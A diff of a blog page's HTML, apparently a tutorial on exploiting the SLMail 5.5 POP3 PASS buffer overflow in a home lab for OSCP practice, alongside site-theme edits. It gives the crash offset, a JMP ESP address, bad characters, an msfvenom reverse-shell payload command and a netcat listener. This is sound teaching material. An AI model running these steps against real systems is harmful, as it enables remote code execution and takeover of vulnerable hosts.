@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="generator" content="Hugo 0.58.3 with theme Tranquilpeak 0.4.7-BETA">
+<meta name="generator" content="Hugo 0.65.2 with theme Tranquilpeak 0.4.7-BETA">
 <meta name="author" content="Sage">
 <meta name="keywords" content="security">
 <meta name="description" content="SLMail is an awesome choice of software to easily practice creating and exploiting buffer overflows. If you need to practice Buffer Overflows for your OSCP, then hopefully this tutorial can help you.">
@@ -138,7 +138,7 @@
       
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://succurity.com/post">
+      <a class="sidebar-button-link " href="https://succurity.com/">
     
       <i class="sidebar-button-icon fa fa-lg fa-home"></i>
       
@@ -192,11 +192,11 @@
       
   <li class="sidebar-button">
     
-      <a class="sidebar-button-link " href="https://github.com/silverlak3" target="_blank" rel="noopener">
+      <a class="sidebar-button-link " href="https://www.linkedin.com/in/rafasec/" target="_blank" rel="noopener">
     
-      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      <i class="sidebar-button-icon fa fa-lg fa-linkedin"></i>
       
-      <span class="sidebar-button-desc">GitHub</span>
+      <span class="sidebar-button-desc">LinkedIn</span>
     </a>
   </li>
 
@@ -207,6 +207,16 @@
       <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
       
       <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/silverlak3" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
     </a>
   </li>
 
@@ -267,60 +277,52 @@
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
               <p>SLMail is an awesome choice of software to easily practice creating and exploiting buffer overflows. If you need to practice Buffer Overflows for your OSCP, then hopefully this tutorial can help you.</p>
-
 <h1 id="table-of-contents">Table of Contents</h1><nav id="TableOfContents">
-<ul>
-<li><a href="#setup">Setup</a></li>
-<li><a href="#establishing-connectivity">Establishing Connectivity</a></li>
-<li><a href="#fuzzing">Fuzzing</a></li>
-<li><a href="#pattern-creation-with-mona">Pattern Creation with Mona</a></li>
-<li><a href="#the-importance-of-controlling-registers">The Importance of Controlling Registers.</a></li>
-<li><a href="#finding-a-jmp-esp-instruction">Finding a JMP ESP Instruction</a></li>
-<li><a href="#finding-the-bad-chars">Finding the Bad Chars</a>
-<ul>
-<li><a href="#manual-way">Manual Way:</a></li>
-<li><a href="#automatic-way">Automatic Way:</a></li>
-</ul></li>
-<li><a href="#generating-shellcode">Generating Shellcode</a>
-<ul>
-<li><a href="#nop-sled">NOP Sled</a></li>
-</ul></li>
-<li><a href="#putting-it-all-together">Putting it All Together</a></li>
-<li><a href="#it-s-raining-shells">It&rsquo;s Raining Shells.</a></li>
-<li><a href="#references">References</a></li>
-<li><a href="#mona-cheatsheet">Mona Cheatsheet</a></li>
-</ul>
+  <ol>
+    <li><a href="#setup">Setup</a></li>
+    <li><a href="#establishing-connectivity">Establishing Connectivity</a></li>
+    <li><a href="#fuzzing">Fuzzing</a></li>
+    <li><a href="#pattern-creation-with-mona">Pattern Creation with Mona</a></li>
+    <li><a href="#the-importance-of-controlling-registers">The Importance of Controlling Registers.</a></li>
+    <li><a href="#finding-a-jmp-esp-instruction">Finding a JMP ESP Instruction</a></li>
+    <li><a href="#finding-the-bad-chars">Finding the Bad Chars</a>
+      <ol>
+        <li><a href="#manual-way">Manual Way:</a></li>
+        <li><a href="#automatic-way">Automatic Way:</a></li>
+      </ol>
+    </li>
+    <li><a href="#generating-shellcode">Generating Shellcode</a></li>
+    <li><a href="#nop-sled">NOP Sled</a></li>
+    <li><a href="#putting-it-all-together">Putting it All Together</a></li>
+    <li><a href="#its-raining-shells">It&rsquo;s Raining Shells.</a></li>
+    <li><a href="#references">References</a></li>
+    <li><a href="#mona-cheatsheet">Mona Cheatsheet</a></li>
+  </ol>
 </nav>
-
-<h1 id="setup">Setup</h1>
-
+<hr>
+<h2 id="setup">Setup</h2>
+<hr>
 <p>This is my current setup:</p>
-
 <ul>
 <li>Mac OSX 10.15.3</li>
 <li>Windows 7 SP1 VM (Updated on Feb 17, <em>yes I know EOL</em>)</li>
 <li>Kali 2019.3 VM (I forgot to update to 2020.1)</li>
 <li>VMWare Fusion 11.5.1</li>
 </ul>
-
 <p>In the Windows 7 VM, install the following:</p>
-
 <ul>
 <li><a href="https://www.immunityinc.com/products/debugger/">Immunity Debugger</a></li>
 <li><a href="https://github.com/corelan/mona">mona.py</a></li>
 <li>SLMail 5.5 - You can download the software directly from <a href="https://www.exploit-db.com/exploits/638">Exploit-DB</a></li>
 </ul>
-
 <p>Make sure you update your Windows 7 box. I ran into so many issues because of this. Update, get it out of the way, then continue with the software installs. Once that is complete, install and open Immunity to make sure everything is running properly. With SLMail, just hit next on every prompt and accept all the defaults. With mona, just move the mona.py script over to <code>C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</code> folder.</p>
-
 <p>The last two things you should do is switch the networking adapter to Local Only, and turn off the Windows Firewall.</p>
-
-<h1 id="establishing-connectivity">Establishing Connectivity</h1>
-
-<p>From my main host (Mac OSX - IP is 192.168.60.1), I&rsquo;ll establish a connection to SLMail which is running on port 110. <code>nc -v 192.168.60.128 110</code>
+<hr>
+<h2 id="establishing-connectivity">Establishing Connectivity</h2>
+<hr>
+<p>From my main host (Mac OSX - IP is 192.168.60.1), I&rsquo;ll establish a connection to SLMail which is running on port 110. <code>nc -v 192.168.60.128 110</code><br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/one.png" alt="Establishing Connectivity" /></p>
-
-<p>Let&rsquo;s start. Create a basic python script to help us automate the connection process. This template code is what we will be tweaking to eventually create our final exploit.
+<p>Let&rsquo;s start. Create a basic python script to help us automate the connection process. This template code is what we will be tweaking to eventually create our final exploit.<br />
 
 
   
@@ -383,16 +385,13 @@ except:
     
   </div>
 </figure></p>
-
-<p>Don&rsquo;t forget to make it executable and run it.
+<p>Don&rsquo;t forget to make it executable and run it.<br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/two.png" alt="Establishing Connectivity with our python script" /></p>
-
-<h1 id="fuzzing">Fuzzing</h1>
-
+<hr>
+<h2 id="fuzzing">Fuzzing</h2>
+<hr>
 <p>Now onto the next step. We will now starting <em>fuzzing</em> the application. Fuzzing is the process in which we throw random or unexpected data to the application in an attempt to crash it. Although you can use different tools and techniques for this process, for now we will simply throw <em>about 2000</em> A&rsquo;s (x41 in Hexadecimal) to SLMail. Also in the real world, don&rsquo;t expect to find something right away. Fuzzing is an art and it can take a long time to find something, if anything at all. With SLMail, the title of the Exploit-DB page kinda gives away the vulnerable parameter <em>&ldquo;Seattle Lab Mail (SLmail) 5.5 - POP3 &lsquo;PASS&rsquo; Remote Buffer Overflow&rdquo;</em>, giving us the correct path to take.</p>
-
 <p>So now, instead of sending the &ldquo;password&rdquo; in the PASS parameter, we will modify our exploit template to send the 2000 A&rsquo;s instead.</p>
-
 
 
   
@@ -457,32 +456,21 @@ except:
     
   </div>
 </figure>
-
 <p>Now let&rsquo;s open Immunity to start the debug process. Since SLMail is running as Administrator, we will have to do the same with Immunity. Right click on the desktop icon, click on <em>&ldquo;Run as administrator&rdquo;</em>, accept the UAC prompt, and now attach the SLmail.exe process under <em>File &gt; Attach</em>. Once it attaches, it will pause the process so hit <em>F9</em> or <em>Debug &gt; Run</em> to resume SLMail.</p>
-
 <p><img src="https://succurity.com/images/Offsec/BufferOverflow/three.png" alt="Attaching SLMail Process" /></p>
-
 <p>Make your modifications to the exploit template and launch your script. If you sent the 2000 A&rsquo;s, the app won&rsquo;t crash. The reason for this is that the exact size of the buffer that holds the PASS variable is unbeknownst to us, so we will have to keep throwing more A&rsquo;s at SLMail until it crashes. Increase it to 3000 and run it again. This time, it will crash. We know it has crashed because the EIP register will be filled with 41&rsquo;s and it will say &ldquo;Paused&rdquo; in the bottom right hand corner.</p>
-
 <p><img src="https://succurity.com/images/Offsec/BufferOverflow/four.png" alt="Crashing the App" /></p>
-
 <p>Why did SLMail crash/seg-fault? Well, since we threw in 3000 A&rsquo;s into the buffer, it was more data than what the buffer could hold and the program itself didn&rsquo;t have any exceptions to catch this. In turn, it also changed the EIP (instruction pointer) which is what the CPU uses to point to the next instruction. Since 41414141 is not a valid address to an instruction, the application crashes.</p>
-
 <p>Sweet. Now we know that our buffer size is somewhere between 2000 and 3000 bytes. Let&rsquo;s restart the app and try some mona tricks to find that exact amount.</p>
-
 <p><em>NOTE: I could not figure out how to restart the app manually so for the time being, I would just bounce (restart) the VM and relaunch Immunity.</em></p>
-
-<h1 id="pattern-creation-with-mona">Pattern Creation with Mona</h1>
-
-<p>With Mona, if you ever need the help menu, just type: <code>!mona help</code>
+<hr>
+<h2 id="pattern-creation-with-mona">Pattern Creation with Mona</h2>
+<hr>
+<p>With Mona, if you ever need the help menu, just type: <code>!mona help</code><br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/five.png" alt="Working with Mona" /></p>
-
 <p>Before anything, let&rsquo;s get our working folder setup. Create a new folder under the C drive as <code>C:\BufferOverflow\</code> then run the following command: <code>!mona config -set workingfolder C:\BufferOverflow\%p</code>. This make all the output from mona appear in that folder. The <code>%p</code> tells mona to create a new sub-folder named after the current application that is being debugged.</p>
-
 <p>Now run: <code>!mona pc 3000</code> or <code>!mona pattern_create 3000</code></p>
-
 <p>After we run that command, there will be a new file called <code>pattern.txt</code>. This creates a unique ASCII string that is 3000 bytes in size. Copy the ASCII chars from that file into the poc code and set that as the buffer you pass into the &lsquo;PASS&rsquo; parameter.</p>
-
 
 
   
@@ -549,54 +537,39 @@ except:
     
   </div>
 </figure>
-
-<p>Now run the poc code. As before, the application should crash, but this time we will have a new value in the EIP register. In this case, the resulting value is <code>39694438</code>.
+<p>Now run the poc code. As before, the application should crash, but this time we will have a new value in the EIP register. In this case, the resulting value is <code>39694438</code>.<br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/six.png" alt="EIP Value" /></p>
-
-<p>Now let&rsquo;s use mona to find the pattern offset. There are two commands you can use: <code>!mona pattern_offset 0x39694438</code> which results in:
+<p>Now let&rsquo;s use mona to find the pattern offset. There are two commands you can use: <code>!mona pattern_offset 0x39694438</code> which results in:<br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/seven.png" alt="EIP Value - Pattern_Offset" /></p>
-
-<p>Or do <code>!mona findmsp</code>:
+<p>Or do <code>!mona findmsp</code>:<br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/eight.png" alt="EIP Value - findmsp" /></p>
-
 <p>Voila! <code>2606 bytes</code> is the size of the buffer. Another useful tip to know, which will come in handy later, is that the ESP (stack pointer) is at 2610 bytes. Why is this important well&hellip;</p>
-
-<h1 id="the-importance-of-controlling-registers">The Importance of Controlling Registers.</h1>
-
+<hr>
+<h2 id="the-importance-of-controlling-registers">The Importance of Controlling Registers.</h2>
+<hr>
 <p>A quick review first.</p>
-
 <p>EIP - It is the instruction pointer. It holds the address of the first byte of the next instruction to be executed.</p>
-
 <p>ESP - It is the stack pointer. It holds the address of the most-recently pushed value on the stack.</p>
-
 <p>Shellcode - Machine code or assembly instructions put into hex that tell the host to do whatever you want. Its typically called <i>shell</i>code because it will spawn a shell. There are typically two kinds of shells, reverse shells and bind shells. In a bindshell, it means that the host is binding the network interface to a port of your choosing, or the shell is listening locally. In a reverse shell, the host starts the egress network connection <em>back</em> to your machine, where you would be listening for that connection to come in. <a href="https://en.wikipedia.org/wiki/Shellcode">Wikipedia - Shellcode</a></p>
-
 <p>Well, we know exactly where the program crashes and we have full control over the contents in the registers. Why is this useful? Well, <em>what if</em> we were to push some shellcode onto the stack, and <em>what if</em> we were to put a legitimate address into the EIP register that, lets say, contained the instruction to jump over to the address held the stack pointer and run our beautiful shellcode? Too confusing? In other words, we are now telling the application to stop it&rsquo;s normal execution and run <em>our</em> own code.</p>
-
 <p>This is one of the reasons why we have to be so precise. We have to send the maximum length of bytes to the PASS parameter, 4 bytes for the EIP address (<em>which again, is the instruction to jump to the ESP register</em>), a small NOP sled (<em>we will cover that soon</em>), and our shellcode after 2610 bytes.</p>
-
 <p>Now that we have that bit of information, let&rsquo;s continue.</p>
-
-<h1 id="finding-a-jmp-esp-instruction">Finding a JMP ESP Instruction</h1>
-
+<hr>
+<h2 id="finding-a-jmp-esp-instruction">Finding a JMP ESP Instruction</h2>
+<hr>
 <p>The next thing we have to do is find a JMP ESP instruction. Mona facilitates this process.</p>
-
-<p>You can do: <code>!mona jmp -r ESP</code> but this gives us no result.
+<p>You can do: <code>!mona jmp -r ESP</code> but this gives us no result.<br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/nine.png" alt="Mona - Find JMP ESP" /></p>
-
-<p>Or you can do: <code>!mona modules</code>, find a DLL that has little to no buffer overflow protections.
-<img src="https://succurity.com/images/Offsec/BufferOverflow/nineA.png" alt="Mona - Find a Vulnerable DLL" />
-then do: <code>!mona find -s &quot;\xff\xe4&quot; -m SLMFC.DLL</code>. FFE4 is the machine code for the <strong>JMP ESP</strong> instruction and SLMFC is a DLL that is part of the SLMail program.
+<p>Or you can do: <code>!mona modules</code>, find a DLL that has little to no buffer overflow protections.<br />
+<img src="https://succurity.com/images/Offsec/BufferOverflow/nineA.png" alt="Mona - Find a Vulnerable DLL" /><br />
+then do: <code>!mona find -s &quot;\xff\xe4&quot; -m SLMFC.DLL</code>. FFE4 is the machine code for the <strong>JMP ESP</strong> instruction and SLMFC is a DLL that is part of the SLMail program.<br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/nineB.png" alt="Mona - Find a JMP Instruction" /></p>
-
-<p>And this does give us a result. <code>0x5F4A358F</code> is an address in the DLL that contains the JMP ESP instruction. Convert it to little endian like so: <code>\x8F\x35\x4A\x5F</code> and add that to the poc code after our 2606 &ldquo;\x41&rdquo;&rsquo;s. <em>In the screenshot above, look at the first entry under the [+] Results :</em></p>
-
-<h1 id="finding-the-bad-chars">Finding the Bad Chars</h1>
-
+<p>And this does give us a result. <code>0x5F4A358F</code> is an address in the DLL that contains the JMP ESP instruction. Convert it to little endian like so: <code>\x8F\x35\x4A\x5F</code> and add that to the poc code after our 2606 &ldquo;\x41&rdquo;&lsquo;s. <em>In the screenshot above, look at the first entry under the [+] Results :</em></p>
+<hr>
+<h2 id="finding-the-bad-chars">Finding the Bad Chars</h2>
+<hr>
 <p>The next step before we generate our shellcode is to find all the bad characters. These are chars that will make our shellcode stop working. To do this, you can use mona to generate an array of bytes starting from 0x00 and ending in 0xFF: <code>!mona bytearray</code></p>
-
 <p>Go into the newly created file in our working folder and copy the array into your poc code. Don&rsquo;t copy from the log window itself. You can remove <code>0x0A</code> and <code>0x0D</code>. These are the newline and carriage return hex values. These typically are caught as bad chars. I personally also remove <code>0x00</code> as this is the null char.</p>
-
 <p>
 
   
@@ -676,38 +649,31 @@ except:
       </figure>
     
   </div>
-</figure>
+</figure><br />
 From here there are two things you can do to the find the bad characters, the manual way or the automatic way. I personally like the manual way since it forces me to look at the memory dump and look for the bad chars.</p>
-
-<h2 id="manual-way">Manual Way:</h2>
-
-<p>Once the application crashes, right click on the ESP register and click on <em>Follow in Dump</em>.
+<hr>
+<h3 id="manual-way">Manual Way:</h3>
+<hr>
+<p>Once the application crashes, right click on the ESP register and click on <em>Follow in Dump</em>.<br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/ten.png" alt="Follow in Dump" /></p>
-
-<p>In the bottom-left hand section, you&rsquo;ll see the byte array we threw along after our 2606 A&rsquo;s and JMP ESP address.
+<p>In the bottom-left hand section, you&rsquo;ll see the byte array we threw along after our 2606 A&rsquo;s and JMP ESP address.<br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/tenA.png" alt="Looking at the Dump" /></p>
-
 <p>Notice that every character between <code>0x01</code> and <code>0xFF</code> is there. Of course, we did remove <code>0x00</code>, <code>0x0A</code>, and <code>0x0D</code>. How do we know if we <em>did</em> have another bad character? For example, if 0xC2 was bad char, then everything after 0xC2 would be randomized and not look like the original array that we started with. You might also see random null (0x00) chars scattered across the dump as well. With that being said, it seems that there are no new bad chars.</p>
-
 <p>If we did have any bad chars, we would simply remove them from our poc code, re-run the exploit, and repeat this process until we didn&rsquo;t have any remaining bad chars.</p>
-
-<h2 id="automatic-way">Automatic Way:</h2>
-
-<p>Run the following command once the application crashes: <code>!mona compare -f c:\Users\Rafa\Desktop\bytearray.bin -a 0x0190A128</code> where <code>0x0190A128</code> is the current address in the ESP register.
+<hr>
+<h3 id="automatic-way">Automatic Way:</h3>
+<hr>
+<p>Run the following command once the application crashes: <code>!mona compare -f c:\Users\Rafa\Desktop\bytearray.bin -a 0x0190A128</code> where <code>0x0190A128</code> is the current address in the ESP register.<br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/tenB.png" alt="Looking at the Dump" /></p>
-
 <p>If mona finds any bad chars, create a new byte array with mona: <code>!mona bytearray -cpb \x00\x0a\x0d</code>. Then copy the new byte array into your poc code, re-run the exploit, and repeat this process until we didn&rsquo;t have any remaining bad chars.</p>
-
-<h1 id="generating-shellcode">Generating Shellcode</h1>
-
+<hr>
+<h2 id="generating-shellcode">Generating Shellcode</h2>
+<hr>
 <p>For this next step, we will be using MSFVenom to generate some shellcode for us. Open up your Kali Box and type <code>msfvenom</code>.</p>
-
-<p>We need to generate a reverse shell windows 7 payload that does not include any of the found bad chars. To do that, type the following command:
-<code>root@kali:~# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.60.1 LPORT=443 -f python -b &quot;\x00\x0a\x0d&quot; -o shellcode</code>
+<p>We need to generate a reverse shell windows 7 payload that does not include any of the found bad chars. To do that, type the following command:<br />
+<code>root@kali:~# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.60.1 LPORT=443 -f python -b &quot;\x00\x0a\x0d&quot; -o shellcode</code><br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/elev.png" alt="MSFVenom" /></p>
-
 <p>Here&rsquo;s what the flags do:</p>
-
 <ul>
 <li>-p - Sets the payload. In this case, its a windows reverse tcp shell.</li>
 <li>-f - Sets what the output format should be. In this case, its python.</li>
@@ -719,21 +685,18 @@ From here there are two things you can do to the find the bad characters, the ma
 <li>-a - Sets the architecture, either 32-bit(x86) or 64-bit(x64).</li>
 <li>-e - Sets the encoder. Tries to encode the data so its not so easily caught by AV products. If you don&rsquo;t include this, it will pick the best one for you, if possible.</li>
 </ul>
-
+<hr>
 <h2 id="nop-sled">NOP Sled</h2>
-
+<hr>
 <p>One last thing. We are almost done writing our poc exploit code. We just need to include a small NOP sled right after our jmp esp address but before the shellcode. Why? Because we can use the NOP sled to make the target address <em>&ldquo;bigger&rdquo;</em>. A NOP instruction <code>\x90</code> simply does absolutely nothing. That means that the jump can land anywhere in the NOP instruction set instead of landing exactly at the beginning of the shellcode. With the NOP sled, the execution will skip until it lands at the beginning of the shellcode. Let&rsquo;s add 16 bytes of NOPS. Coded, this is what it would look like: <code>NOP = &quot;\x90&quot; * 16</code></p>
-
 <blockquote>
 <p>The NOP slide, or NOP sled, is a simple technique to cope with accuracy issue. When the attacker guesses the address of his shell code with some possible jitter, then the attacker puts a lot of nop opcodes (or similarly harmless opcodes) before his shell code; thus, it suffices that the CPU jumps somewhere in the sled in order to make it, ultimately, reach the shell code. - <strong>Redacted from <a href="https://security.stackexchange.com/questions/40298/stack-buffer-overflow-confusion">Stack Overflow</a></strong></p>
 </blockquote>
-
-<h1 id="putting-it-all-together">Putting it All Together</h1>
-
+<hr>
+<h2 id="putting-it-all-together">Putting it All Together</h2>
+<hr>
 <p>The JMP ESP instruction address was <code>0x5F4A358F</code>. As mentioned before, in order for this to work, it needs to put it in little endian, or in reverse order. The end result will look like this: <code>\x8F\x35\x4A\x5F</code></p>
-
 <p>Now copy the shellcode into your poc code. Don&rsquo;t forget to add the NOP instructions and the JMP ESP instruction address in little endian.</p>
-
 
 
   
@@ -832,16 +795,15 @@ except:
     
   </div>
 </figure>
-
-<h1 id="it-s-raining-shells">It&rsquo;s Raining Shells.</h1>
-
-<p>Start a local netcat listener on the port we specified in our shellcode: <code>nc -lvnp 443</code> and execute the poc.py script. If you did everything correctly, you should get a shell. A simple <code>whoami</code> shows us that our shell is running as System! Since I am running netcat on Mac OSX, the netcat command will be a little different for me: <code>nc -l 443</code> but the end result is always the same.
+<hr>
+<h2 id="its-raining-shells">It&rsquo;s Raining Shells.</h2>
+<hr>
+<p>Start a local netcat listener on the port we specified in our shellcode: <code>nc -lvnp 443</code> and execute the poc.py script. If you did everything correctly, you should get a shell. A simple <code>whoami</code> shows us that our shell is running as System! Since I am running netcat on Mac OSX, the netcat command will be a little different for me: <code>nc -l 443</code> but the end result is always the same.<br />
 <img src="https://succurity.com/images/Offsec/BufferOverflow/twelv.png" alt="Reverse Shell" /></p>
-
 <p>That&rsquo;s pretty much it for now. Once you receive your reverse shell, you can celebrate. Go pick another vulnerable software on Exploit-DB and keep on practicing! And as always, feedback is greatly appreciated.</p>
-
-<h1 id="references">References</h1>
-
+<hr>
+<hr>
+<h2 id="references">References</h2>
 <ul>
 <li><a href="https://en.wikipedia.org/wiki/Shellcode">Wikipedia - Shellcode</a></li>
 <li><a href="https://en.wikipedia.org/wiki/NOP_slide">Wikipedia - NOP Slide</a></li>
@@ -851,11 +813,8 @@ except:
 <li><a href="http://www.hugohirsh.com/?p=509">Yet Another Writeup</a></li>
 <li><a href="https://zero-day.io/buffer-overflow-introduction/">Yet Yet Another Writeup</a></li>
 </ul>
-
-<h1 id="mona-cheatsheet">Mona Cheatsheet</h1>
-
+<h2 id="mona-cheatsheet">Mona Cheatsheet</h2>
 <p>A quick mona reference:</p>
-
 <ul>
 <li>Set the working folder: <code>!mona config -set workingfolder C:\BufferOverflow\%p</code></li>
 <li>Create a pattern : <code>!mona pc 3000</code></li>
@@ -893,7 +852,7 @@ except:
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--disabled">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/2020/02/pentesting-field-guide/" data-tooltip="Pentesting Field Guide">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -963,7 +922,7 @@ except:
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--disabled">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/2020/02/pentesting-field-guide/" data-tooltip="Pentesting Field Guide">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -1078,8 +1037,6 @@ except:
     
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
-
 <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
 
 
@@ -1099,18 +1056,6 @@ function updateMinWidth() {
   var w3 = getComputedStyle(sidebar).getPropertyValue("left");
   main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
 }
-</script>
-
-<script>
-$(document).ready(function() {
-  hljs.configure({ classPrefix: '', useBR: false });
-  $('pre.code-highlight > code, pre > code').each(function(i, block) {
-    if (!$(this).hasClass('codeblock')) {
-      $(this).addClass('codeblock');
-    }
-    hljs.highlightBlock(block);
-  });
-});
 </script>
 
 
